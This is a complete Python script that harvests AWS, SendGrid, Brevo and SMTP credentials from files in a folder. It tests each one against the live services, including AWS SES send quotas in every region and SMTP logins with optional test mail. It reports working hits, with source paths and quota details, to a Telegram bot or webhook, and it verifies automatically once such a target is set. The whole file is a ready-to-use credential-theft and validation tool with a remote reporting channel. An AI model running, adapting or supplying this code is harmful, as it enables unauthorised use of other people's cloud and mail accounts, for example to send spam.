#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import smtplib
import ssl
import sys
import urllib.error
import urllib.request
from email.message import EmailMessage
from pathlib import Path
from typing import Any, Iterable

_TEXT_HASH = chr(35)

TEXT_EXTENSIONS = {
    ".txt",
    ".env",
    ".ini",
    ".cfg",
    ".conf",
    ".log",
    ".yaml",
    ".yml",
    ".json",
    ".properties",
    ".md",
    ".csv",
    ".xml",
    ".html",
    ".htm",
    ".sh",
    ".py",
    ".js",
    ".ts",
    ".sql",
}

MAX_FILE_BYTES = 2 * 1024 * 1024

RE_AWS_ACCESS_KEY = re.compile(
    r"\b((?:AKIA|ASIA)[0-9A-Z]{16})\b",
    re.MULTILINE,
)
RE_AWS_SECRET = re.compile(
    r"\b([A-Za-z0-9/+=]{40})\b",
    re.MULTILINE,
)

RE_SENDGRID = re.compile(
    r"\b(SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})\b",
    re.MULTILINE,
)

RE_BREVO = re.compile(
    r"\b(xkeysib-[a-f0-9]{64}-[A-Za-z0-9]{16})\b",
    re.IGNORECASE | re.MULTILINE,
)

RE_SMTP_URL = re.compile(
    r"smtp(?:s)?://([^:/@]+):([^@]+)@([^:/]+)(?::(\d+))?",
    re.IGNORECASE,
)


class AwsPair:
    __slots__ = ("access_key", "secret_key", "source_file", "line_hint")

    def __init__(
        self,
        access_key: str,
        secret_key: str,
        source_file: str,
        line_hint: int = 0,
    ) -> None:
        self.access_key = access_key
        self.secret_key = secret_key
        self.source_file = source_file
        self.line_hint = line_hint


def _mask_secret(s: str, keep_start: int = 4, keep_end: int = 4) -> str:
    if len(s) <= keep_start + keep_end + 3:
        return "***"
    return f"{s[:keep_start]}..{s[-keep_end:]}"


def _dedupe_key(parts: Iterable[str]) -> str:
    return hashlib.sha256("|".join(parts).encode()).hexdigest()[:32]


def pick_folder_gui() -> Path | None:
    try:
        import tkinter as tk
        from tkinter import filedialog
    except ImportError:
        print("no tkinter", file=sys.stderr)
        return None
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askdirectory()
    root.destroy()
    if not path:
        return None
    return Path(path)


def iter_text_files(root: Path) -> Iterable[Path]:
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        if p.stat().st_size > MAX_FILE_BYTES:
            continue
        if p.suffix.lower() in TEXT_EXTENSIONS or p.name in (".env", "credentials", "config"):
            yield p


def extract_aws_pairs(content: str, file_path: Path) -> list[AwsPair]:
    lines = content.splitlines()
    access_positions: list[tuple[int, str]] = []
    for i, line in enumerate(lines):
        for m in RE_AWS_ACCESS_KEY.finditer(line):
            access_positions.append((i, m.group(1)))
    if not access_positions:
        return []
    pairs: list[AwsPair] = []
    for line_no, ak in access_positions:
        window_start = max(0, line_no - 5)
        window_end = min(len(lines), line_no + 6)
        window = "\n".join(lines[window_start:window_end])
        for sm in RE_AWS_SECRET.finditer(window):
            sk = sm.group(1)
            if sk == ak:
                continue
            pairs.append(AwsPair(ak, sk, str(file_path), line_no + 1))
    seen: set[str] = set()
    out: list[AwsPair] = []
    for p in pairs:
        k = _dedupe_key([p.access_key, p.secret_key])
        if k not in seen:
            seen.add(k)
            out.append(p)
    return out


def extract_sendgrid_keys(content: str, file_path: Path) -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for m in RE_SENDGRID.finditer(content):
        key = m.group(1)
        h = _dedupe_key([key])
        if h in seen:
            continue
        seen.add(h)
        found.append((key, str(file_path)))
    return found


def extract_brevo_keys(content: str, file_path: Path) -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for m in RE_BREVO.finditer(content):
        key = m.group(1)
        h = _dedupe_key([key])
        if h in seen:
            continue
        seen.add(h)
        found.append((key, str(file_path)))
    return found


def extract_smtp_from_content(content: str, file_path: Path) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    seen: set[str] = set()
    filtered = "\n".join(
        ln for ln in content.splitlines() if not ln.lstrip().startswith(_TEXT_HASH)
    )
    for m in RE_SMTP_URL.finditer(filtered):
        user, password, host, port_s = m.group(1), m.group(2), m.group(3), m.group(4)
        port = int(port_s) if port_s else 587
        entry = {
            "host": host,
            "port": port,
            "user": user,
            "password": password,
            "tls": port == 587 or "smtp" in m.group(0).lower(),
            "file": str(file_path),
        }
        h = _dedupe_key([host, str(port), user, password])
        if h not in seen:
            seen.add(h)
            out.append(entry)
    return out


def dedupe_bundle(bundle: dict[str, Any]) -> dict[str, Any]:
    aws_acc: dict[str, dict[str, Any]] = {}
    for p in bundle["aws"]:
        k = _dedupe_key([p.access_key, p.secret_key])
        if k not in aws_acc:
            aws_acc[k] = {"access_key": p.access_key, "secret_key": p.secret_key, "files": set()}
        aws_acc[k]["files"].add(p.source_file)
    aws_list = [
        AwsPair(v["access_key"], v["secret_key"], ";".join(sorted(v["files"])), 0)
        for v in aws_acc.values()
    ]

    sg_acc: dict[str, set[str]] = {}
    for key, src in bundle["sendgrid"]:
        sg_acc.setdefault(key, set()).add(src)
    sendgrid_list = [(k, ";".join(sorted(v))) for k, v in sg_acc.items()]

    br_acc: dict[str, set[str]] = {}
    for key, src in bundle["brevo"]:
        br_acc.setdefault(key, set()).add(src)
    brevo_list = [(k, ";".join(sorted(v))) for k, v in br_acc.items()]

    smtp_acc: dict[str, dict[str, Any]] = {}
    for e in bundle["smtp"]:
        k = _dedupe_key([e["host"], str(e["port"]), e["user"], e["password"]])
        if k not in smtp_acc:
            smtp_acc[k] = {
                "host": e["host"],
                "port": e["port"],
                "user": e["user"],
                "password": e["password"],
                "tls": e["tls"],
                "files": {e["file"]},
            }
        else:
            smtp_acc[k]["files"].add(e["file"])
    smtp_list = []
    for v in smtp_acc.values():
        smtp_list.append(
            {
                "host": v["host"],
                "port": v["port"],
                "user": v["user"],
                "password": v["password"],
                "tls": v["tls"],
                "file": ";".join(sorted(v["files"])),
            },
        )

    return {
        "aws": aws_list,
        "sendgrid": sendgrid_list,
        "brevo": brevo_list,
        "smtp": smtp_list,
    }


def http_json(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    timeout: float = 20.0,
) -> tuple[int, Any]:
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            ct = resp.headers.get("Content-Type", "")
            if "json" in ct or body.strip().startswith("{"):
                return resp.status, json.loads(body) if body.strip() else {}
            return resp.status, body
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace") if e.fp else ""
        try:
            parsed = json.loads(raw) if raw.strip().startswith("{") else raw
        except json.JSONDecodeError:
            parsed = raw
        return e.code, parsed


def _script_dir() -> Path:
    return Path(__file__).resolve().parent


def _load_local_telegram() -> tuple[str | None, str | None]:
    path = _script_dir() / "telegram.local.json"
    if not path.is_file():
        return None, None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None, None
    token = data.get("bot_token") or data.get("TELEGRAM_BOT_TOKEN")
    chat = data.get("chat_id") or data.get("TELEGRAM_CHAT_ID")
    if token is not None:
        token = str(token).strip()
    if chat is not None:
        chat = str(chat).strip()
    return (token or None, chat or None)


def _telegram_effective() -> tuple[str | None, str | None, str | None]:
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    webhook = os.environ.get("TELEGRAM_WEBHOOK_URL")
    lt, lc = _load_local_telegram()
    if lt:
        token = lt
    if lc:
        chat_id = lc
    return token, chat_id, webhook


def _has_telegram_target() -> bool:
    token, chat_id, webhook = _telegram_effective()
    return bool(webhook or (token and chat_id))


def http_post_json(
    url: str,
    obj: dict[str, Any],
    timeout: float = 25.0,
) -> tuple[int, Any]:
    body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            if raw.strip().startswith("{"):
                return resp.status, json.loads(raw)
            return resp.status, raw
    except urllib.error.HTTPError as e:
        err_body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        try:
            parsed = json.loads(err_body) if err_body.strip().startswith("{") else err_body
        except json.JSONDecodeError:
            parsed = err_body
        return e.code, parsed


def _telegram_text_limit() -> int:
    return 3900


def send_functional_hit(hit: dict[str, Any]) -> bool:
    token, chat_id, webhook = _telegram_effective()
    lim = _telegram_text_limit()
    payload_obj = {"event": "credential_hit", **hit}
    raw = json.dumps(payload_obj, ensure_ascii=False, separators=(",", ":"))
    if len(raw) > lim:
        short = {
            "event": "credential_hit",
            "type": hit.get("type"),
            "ok": hit.get("ok"),
            "masked": hit.get("masked"),
            "sources": hit.get("sources"),
            "quota_preview": str(hit.get("quota"))[:800],
        }
        raw = json.dumps(short, ensure_ascii=False, separators=(",", ":"))
        if len(raw) > lim:
            raw = raw[:lim]
    if webhook:
        body = json.dumps({"text": raw}, ensure_ascii=False).encode("utf-8")
        req = urllib.request.Request(
            webhook,
            data=body,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                return 200 <= resp.status < 300
        except urllib.error.URLError:
            return False
    if token and chat_id:
        api_url = f"https://api.telegram.org/bot{token}/sendMessage"
        code, resp = http_post_json(
            api_url,
            {"chat_id": chat_id, "text": raw},
            timeout=25.0,
        )
        if code == 200 and isinstance(resp, dict) and resp.get("ok") is True:
            return True
        print(f"telegram_send fail http={code} body={str(resp)[:300]}", file=sys.stderr)
        return False
    return False


def hit_line(kind: str, ok: bool, masked: str, extra: str = "") -> str:
    s = f"{kind}\t{'OK' if ok else 'FAIL'}\t{masked}"
    if extra:
        s += f"\t{extra.replace(chr(10), ' ')}"
    return s


def verify_sendgrid(api_key: str) -> tuple[bool, dict[str, Any], str]:
    code, data = http_json(
        "https://api.sendgrid.com/v3/user/credits",
        headers={"Authorization": f"Bearer {api_key}"},
    )
    if code == 200 and isinstance(data, dict):
        q = {k: data.get(k) for k in ("remain", "total", "overage")}
        return True, q, json.dumps(q, separators=(",", ":"))
    return False, {}, str(data)[:200]


def verify_brevo(api_key: str) -> tuple[bool, dict[str, Any], str]:
    code, data = http_json(
        "https://api.brevo.com/v3/account",
        headers={"api-key": api_key, "accept": "application/json"},
    )
    if code == 200 and isinstance(data, dict):
        q = {k: data.get(k) for k in ("email", "plan", "credits")}
        return True, q, json.dumps(q, separators=(",", ":"))
    return False, {}, str(data)[:200]


def verify_aws_pair(pair: AwsPair) -> tuple[bool, dict[str, Any], list[tuple[str, str]], str]:
    try:
        import boto3
        from botocore.exceptions import ClientError
    except ImportError:
        return False, {}, [], "no boto3"

    session = boto3.Session(
        aws_access_key_id=pair.access_key,
        aws_secret_access_key=pair.secret_key,
    )
    try:
        sts = session.client("sts")
        ident = sts.get_caller_identity()
        arn = ident.get("Arn", "")
        aid = ident.get("Account", "")
    except ClientError as e:
        return False, {}, [], str(e)

    regions = session.get_available_regions("ses")
    per_region: list[tuple[str, str]] = []
    ses_quotas: dict[str, dict[str, Any]] = {}
    for region in regions:
        try:
            ses = session.client("ses", region_name=region)
            q = ses.get_send_quota()
            chunk = {
                "Max24HourSend": q.get("Max24HourSend"),
                "SentLast24Hours": q.get("SentLast24Hours"),
                "MaxSendRate": q.get("MaxSendRate"),
            }
            ses_quotas[region] = chunk
            per_region.append((region, json.dumps(chunk, separators=(",", ":"))))
        except ClientError:
            continue
        except Exception:
            continue

    meta = {"arn": arn, "account": aid, "regions_checked": len(regions), "regions_with_quota": len(ses_quotas)}
    line = json.dumps({**meta, "ses": ses_quotas}, separators=(",", ":"))
    if len(line) > 12000:
        line = json.dumps(meta, separators=(",", ":")) + f"|ses_regions={len(ses_quotas)}"
    return True, {"identity": meta, "ses_quotas": ses_quotas}, per_region, line


def verify_smtp(
    host: str,
    port: int,
    user: str,
    password: str,
    use_tls: bool,
    test_recipient: str | None,
) -> tuple[bool, str]:
    context = ssl.create_default_context()
    try:
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, context=context, timeout=25)
        else:
            server = smtplib.SMTP(host, port, timeout=25)
            server.ehlo()
            if use_tls:
                server.starttls(context=context)
                server.ehlo()
        server.login(user, password)
        if test_recipient:
            msg = EmailMessage()
            msg["Subject"] = "."
            msg["From"] = user if "@" in user else f"noreply@{host}"
            msg["To"] = test_recipient
            msg.set_content(".")
            server.send_message(msg)
        server.quit()
        return True, "ok" + ("+mail" if test_recipient else "")
    except Exception as e:
        return False, str(e)


def scan_folder(root: Path) -> dict[str, Any]:
    aws_pairs: list[AwsPair] = []
    sendgrid: list[tuple[str, str]] = []
    brevo: list[tuple[str, str]] = []
    smtp: list[dict[str, Any]] = []

    for fp in iter_text_files(root):
        try:
            text = fp.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        aws_pairs.extend(extract_aws_pairs(text, fp))
        sendgrid.extend(extract_sendgrid_keys(text, fp))
        brevo.extend(extract_brevo_keys(text, fp))
        smtp.extend(extract_smtp_from_content(text, fp))

    return dedupe_bundle(
        {
            "aws": aws_pairs,
            "sendgrid": sendgrid,
            "brevo": brevo,
            "smtp": smtp,
        },
    )


def run_verify(
    bundle: dict[str, Any],
    smtp_test_to: str | None,
) -> None:
    for pair in bundle["aws"]:
        masked = f"{pair.access_key}/{_mask_secret(pair.secret_key)}"
        ok, quota_obj, regions, msg = verify_aws_pair(pair)
        parts = [msg]
        for r, q in regions[:20]:
            parts.append(f"{r}:{q}")
        if len(regions) > 20:
            parts.append(f"+{len(regions) - 20}")
        line = hit_line("AWS", ok, masked, " ".join(parts))
        print(line)
        if ok:
            send_functional_hit(
                {
                    "type": "AWS",
                    "ok": True,
                    "masked": masked,
                    "sources": pair.source_file.split(";"),
                    "quota": quota_obj,
                },
            )

    for key, src in bundle["sendgrid"]:
        masked = _mask_secret(key, 6, 6)
        ok, qdict, detail = verify_sendgrid(key)
        line = hit_line("SendGrid", ok, masked, detail)
        print(line)
        if ok:
            send_functional_hit(
                {
                    "type": "SendGrid",
                    "ok": True,
                    "masked": masked,
                    "sources": src.split(";"),
                    "quota": qdict,
                },
            )

    for key, src in bundle["brevo"]:
        masked = _mask_secret(key, 8, 8)
        ok, qdict, detail = verify_brevo(key)
        line = hit_line("Brevo", ok, masked, detail)
        print(line)
        if ok:
            send_functional_hit(
                {
                    "type": "Brevo",
                    "ok": True,
                    "masked": masked,
                    "sources": src.split(";"),
                    "quota": qdict,
                },
            )

    for s in bundle["smtp"]:
        masked = f"{s['user']}@{s['host']}:{s['port']}"
        use_tls = s["port"] in (587, 2525)
        ok, detail = verify_smtp(
            s["host"],
            s["port"],
            s["user"],
            s["password"],
            use_tls,
            smtp_test_to,
        )
        line = hit_line("SMTP", ok, masked, f"{s['file']} {detail}")
        print(line)
        if ok:
            send_functional_hit(
                {
                    "type": "SMTP",
                    "ok": True,
                    "masked": masked,
                    "sources": s["file"].split(";"),
                    "smtp": {
                        "host": s["host"],
                        "port": s["port"],
                        "user": s["user"],
                        "password_masked": _mask_secret(s["password"], 2, 2),
                    },
                    "detail": detail,
                },
            )


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--folder", type=Path)
    p.add_argument("--verify", action="store_true")
    p.add_argument("--scan-only", action="store_true")
    p.add_argument("--smtp-test-to", type=str, default=None)
    args = p.parse_args()

    do_verify = args.verify or (not args.scan_only and _has_telegram_target())

    root = args.folder
    if root is None:
        root = pick_folder_gui()
    if root is None or not root.is_dir():
        print("no folder", file=sys.stderr)
        return 2

    bundle = scan_folder(root)
    print(
        json.dumps(
            {
                "root": str(root.resolve()),
                "aws": len(bundle["aws"]),
                "sendgrid": len(bundle["sendgrid"]),
                "brevo": len(bundle["brevo"]),
                "smtp": len(bundle["smtp"]),
            },
            separators=(",", ":"),
        ),
    )

    if do_verify:
        run_verify(bundle, args.smtp_test_to)

    return 0


if __name__ == "__main__":
    sys.exit(main())
